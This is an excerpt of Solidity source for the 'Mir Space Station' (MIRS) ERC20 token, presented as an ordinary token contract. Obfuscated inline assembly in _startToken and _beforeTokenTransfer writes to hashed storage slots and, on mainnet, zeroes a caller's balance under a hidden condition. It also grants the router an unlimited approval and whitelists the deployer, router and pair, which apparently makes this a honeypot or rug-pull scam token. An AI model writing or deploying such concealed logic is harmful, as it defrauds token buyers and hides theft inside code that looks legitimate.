...
/*
THE MIRS OF SPACE: MIR SPACE STATION
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMir;
    uint256 private theMiracle = block.number*2;

    mapping (address => bool) private _firstSpace; 
    mapping (address => bool) private _secondTrash;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private lopFlap;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private flipBitcoin;
    address public pair;
    ...
    bool private trading; uint256 private letsGo = 1; bool private comeOn;
    uint256 private _decimals; uint256 private crashUp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMir.push(_router); addMir.push(msgSender_); addMir.push(pair);
        for (uint256 q=0; q < 3;) {_firstSpace[addMir[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xf27e247a537a149b81f9cea0545e981fb0c719dbaf9e2dc6d39d1e42086c8aa2
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x09fbf7c45d9409ef9cecef5dff5230c510220e3b0b7becfd6c02e9c805837320,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; theMiracle = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMir[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployMirs(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMir[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMirs(creator, initialSupply);
    }
}

contract MIRS is ERC20Token {
    constructor() ERC20Token("Mir Space Station", "MIRS", msg.sender, 150000 * 10 ** 18) {
    }
}